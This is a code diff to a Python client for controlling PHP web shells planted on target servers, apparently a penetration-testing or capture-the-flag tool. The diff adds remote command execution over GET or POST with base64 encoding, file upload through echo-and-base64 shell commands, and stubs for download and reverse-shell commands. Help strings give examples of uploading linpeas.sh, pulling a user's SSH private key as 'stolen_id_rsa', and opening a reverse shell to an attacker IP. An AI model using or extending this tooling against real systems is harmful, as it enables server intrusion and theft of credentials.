@@ -9,7 +9,14 @@ basepath = os.path.dirname(os.path.abspath(__file__))
 
 
 class PHP_Web_Shell_Handler:
-    def __init__(self, webshell_url, webshell_get_param=None, encoded=True):
+    DEFAULT_WEBSHELL_PARAM = "phpshellcmd"
+    UPLOAD_HELP = "\n\t[ UPLOAD ] - 'upload localfilepath remotefilepath' - uploads a file to the server, from 'localfilepath' on your machine, to 'remotefilepath' on the remote machine\n" + "\tEXAMPLE: upload /opt/linpeas.sh /tmp/linpeas.sh"
+    DOWNLOAD_HELP = "\n\t[ DOWNLOAD ] - 'download remotefilepath localfilepath' - downloads a file from the server, from 'remotefilepath' on the target machine, to 'localfilepath' on your machine\n" + "\tEXAMPLE: download /home/user/.ssh/id_rsa /home/watchdog/stolen_id_rsa"
+    SWITCHSHELL_HELP = "\n\t[ SWITCHSHELL ] - ' new_shellfile' - switches the file currently used by the shell handler to a new file (often used for switching between encoded and non encoded shells)\n" + "\tEXAMPLE: switchshell /path/to/newshell.php"
+    SHELL_HELP = "\n\t[ SHELL ] - 'shell listening_ip listening_port' - attempts to run a reverse shell to give shell access to listening_ip on listening_port\n" + "\tEXAMPLE: shell 10.10.10.10 9001"
+    QUIT_HELP = "\n\t[ QUIT (or EXIT) ] - 'quit' - quits the current session and exits the program (also works with 'exit')\n"
+
+    def __init__(self, webshell_url, webshell_param=None, encoded=True):
         try:
             webshell_url = web_utils.validate_url(webshell_url)
         except web_utils.InvalidUrlError:
@@ -20,11 +27,11 @@ class PHP_Web_Shell_Handler:
             sys.exit(1)
 
         self.webshell_url = webshell_url
-        if not webshell_get_param:
-            webshell_get_param = "phpshellcmd"
-        self.webshell_get_param = webshell_get_param
+        if not webshell_param:
+            webshell_param = self.DEFAULT_WEBSHELL_PARAM
+        self.webshell_param = webshell_param
         self.encoded = encoded
-    
+
     def _encode_cmd(self, cmd):
         encoded_cmd = b64encode(cmd.encode()).decode()
         return encoded_cmd
@@ -34,45 +41,100 @@ class PHP_Web_Shell_Handler:
             decoded_result = b64decode(result.encode()).decode()
         except binascii.Error:
             return f"[-] - Result was not valid base64 and therefore could not be decoded...\nRESULT:\n{result}"
-        
+
         return decoded_result
 
     def _exec_cmd(self, cmd):
         if self.encoded:
             cmd = self._encode_cmd(cmd)
-
-        request_url = self.webshell_url + "?" + self.webshell_get_param + "=" + cmd
-
-        result = web_utils.make_request(request_url).text
+        if len(cmd) < 2048:
+            request_url = self.webshell_url + "?" + self.webshell_param + "=" + cmd
+            result = web_utils.make_request(request_url, timeout=30).text
+        else:
+            post_data = {self.webshell_param: cmd}
+            result = web_utils.make_request(self.webshell_url, method="POST", post_data=post_data, timeout=30).text
 
         if self.encoded:
             return self._decode_result(result)
-        
+
         return result
 
-    def upload_file_to_server(self):
-        pass
+    def upload_file_to_server(self, cmd):
+        cmd_args = cmd.split(" ")
+        if len(cmd_args) != 3:
+            self.show_help("HELP UPLOAD")
+            return
+        local_filepath = cmd_args[1]
+        remote_filepath = cmd_args[2]
 
-    def download_file_from_server(self):
-        pass
+        if not os.path.exists(local_filepath):
+            print(f"[-] - {local_filepath} does not exist, so cannot be uploaded...")
+            return
 
-    def switch_webshell(self):
-        pass 
+        file_contents = None
+        try:
+            with open(local_filepath, 'r') as f:
+                file_contents = f.read()
+        except IOError:
+            print(f"[-] - {local_filepath} is not accessible, so cannot be uploaded...")
+            return
 
-    def catch_reverse_shell(self):
-        pass
+        if file_contents:
+            encoded_file_contents = b64encode(file_contents.encode()).decode()
+            upload_command = f"echo {encoded_file_contents} | base64 -d > {remote_filepath}"
+            self._exec_cmd(upload_command)
 
-    def show_help(self):
+            check_upload_cmd = f"cat {remote_filepath}"
+            
+            if file_contents in self._exec_cmd(check_upload_cmd):
+                print(f"[+] - '{local_filepath}'' UPLOADED TO '{remote_filepath}'' ON THE REMOTE SERVER!")
+            else:
+                print(f"[?] - '{local_filepath}'' MAY BE UPLAODED to '{remote_filepath}'' ON THE REMOTE SERVER... RUN 'cat {remote_filepath}' TO VALIDATE (AUTO CHECKING FAILED)")
+
+    def download_file_from_server(self, cmd):
+        cmd_args = cmd.split(" ")
+        if len(cmd_args) != 3:
+            self.show_help("HELP DOWNLOAD")
+            return
+        remote_filepath = cmd_args[1]
+        local_filepath = cmd_args[2]
+
+    def switch_webshell(self, cmd):
+        cmd_args = cmd.split(" ")
+        if len(cmd_args) != 2:
+            self.show_help("HELP SWITCHSHELL")
+            return 
+        new_shell_path = cmd_args[1]
+
+    def catch_reverse_shell(self, cmd):
+        cmd_args = cmd.split(" ")
+        if len(cmd_args) != 3:
+            self.show_help("HELP SHELL")
+            return
+        listening_ip = cmd_args[1]
+        listening_port = cmd_args[2]
+
+    def show_help(self, cmd):
         print("[*] - COMMAND HELP:")
-        print("\n\t[ UPLOAD ] - 'upload localfilepath remotefilepath' - uploads a file to the server, from 'localfilepath' on your machine, to 'remotefilepath' on the remote machine\n" +
-            "\tEXAMPLE: upload /opt/linpeas.sh /tmp/linpeas.sh")
-        print("\n\t[ DOWNLOAD ] - 'download remotefilepath localfilepath' - downloads a file from the server, from 'remotefilepath' on the target machine, to 'localfilepath' on your machine\n" +
-            "\tEXAMPLE: download /home/user/.ssh/id_rsa /home/watchdog/stolen_id_rsa")
-        print("\n\t[ SWITCHSHELL ] - 'switchshell current_shellfile new_shellfile' - switches the file currently used by the shell handler to a new file (often used for switching between encoded and non encoded shells)\n" +
-            "\tEXAMPLE: switchshell /path/to/shell.php /path/to/newshell.php")
-        print("\n\t[ SHELL ] - 'shell listening_ip listening_port' - attempts to run a reverse shell to give shell access to listening_ip on listening_port\n" +
-            "\tEXAMPLE: shell 10.10.10.10 9001")
-        print("\n\t[ QUIT (or EXIT) ] - 'quit' - quits the current session and exits the program (also works with 'exit')\n")
+        if cmd.upper() == "HELP UPLOAD":
+            output = self.UPLOAD_HELP
+
+        elif cmd.upper() == "HELP DOWNLOAD":
+            output = self.DOWNLOAD_HELP
+
+        elif cmd.upper() == "HELP SWITCHSHELL":
+            output = self.SWITCHSHELL_HELP
+
+        elif cmd.upper() == "HELP SHELL":
+            output = self.SHELL_HELP
+
+        elif cmd.upper() == "HELP EXIT" or cmd.upper() == "HELP QUIT":
+            output = self.QUIT_HELP
+
+        else:
+            output = self.UPLOAD_HELP + self.DOWNLOAD_HELP + self.SWITCHSHELL_HELP + self.SHELL_HELP + self.QUIT_HELP
+
+        print(output)
 
     def shell(self):
         shell_filename = basepath +"/phpshells/shell.php"
@@ -84,26 +146,26 @@ class PHP_Web_Shell_Handler:
             print(f.read() + "\n")
 
         shell_banner = self.webshell_url.split("/")[-1].split('.')[0] + "@" + self.webshell_url.split("/")[-2]
-        
+
         while True:
             cmd = input(f"[ {shell_banner} ] > ")
             if not cmd:
                 continue
 
             elif cmd.upper().startswith("UPLOAD"):
-                self.upload_file_to_server()
+                self.upload_file_to_server(cmd)
 
             elif cmd.upper().startswith("DOWNLOAD"):
-                self.download_file_from_server()
+                self.download_file_from_server(cmd)
 
             elif cmd.upper().startswith("SWITCHSHELL"):
-                self.switch_webshell()
+                self.switch_webshell(cmd)
 
             elif cmd.upper().startswith("SHELL"):
-                self.catch_reverse_shell()
+                self.catch_reverse_shell(cmd)
 
             elif cmd.upper() == ("HELP"):
-                self.show_help()
+                self.show_help(cmd)
 
             elif cmd.upper() == "QUIT" or cmd.upper() == "EXIT":
                 sys.exit(1)
@@ -115,7 +177,7 @@ class PHP_Web_Shell_Handler:
 def main():
     arg_parser = argparse.ArgumentParser(description="Python based tool to interact with php web shells!")
     arg_parser.add_argument("-u", "--url", help=f"The URL location that your web shell will be uploaded to", required=True)
-    arg_parser.add_argument("-p", "--param", help=f"The name of the php get parameter used in the php file uploaded (default of 'phpshellcmd' is used with the built in php shells that are suggested to be used")
+    arg_parser.add_argument("-p", "--param", help=f"The name of the php get parameter used in the php file uploaded (default of '{PHP_Web_Shell_Handler.DEFAULT_WEBSHELL_PARAM}' is used with the built in php shells that are suggested to be used")
     arg_parser.add_argument("--encoded", help=f"Decide whether communication with the shell will be encoded or not (default is not encoded)", nargs='*')
 
     args = arg_parser.parse_args()
@@ -130,7 +192,7 @@ def main():
     if args.encoded != None:
         encoded = True
 
-    handler = PHP_Web_Shell_Handler(url, encoded=encoded, webshell_get_param=php_param_name)    
+    handler = PHP_Web_Shell_Handler(url, encoded=encoded, webshell_param=php_param_name)    
     handler.shell()
 
 
